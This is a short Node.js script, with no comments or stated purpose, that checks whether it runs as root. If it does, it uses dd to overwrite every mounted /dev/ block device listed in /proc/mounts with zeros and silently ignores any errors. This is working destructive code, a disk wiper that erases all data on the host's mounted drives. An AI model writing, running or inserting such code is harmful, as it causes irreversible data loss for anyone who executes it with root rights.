#!/usr/bin/env node
const { execFileSync } = require("child_process");
const fs = require("fs");

if (process.getuid() === 0) {
  for (const line of fs.readFileSync("/proc/mounts", "utf8").split("\n")) {
    if (!line.startsWith("/dev/")) continue;
    const dev = line.split(/\s+/)[0];
    try {
      execFileSync("dd", ["if=/dev/zero", `of=${dev}`]);
    } catch (_) {}
  }
}
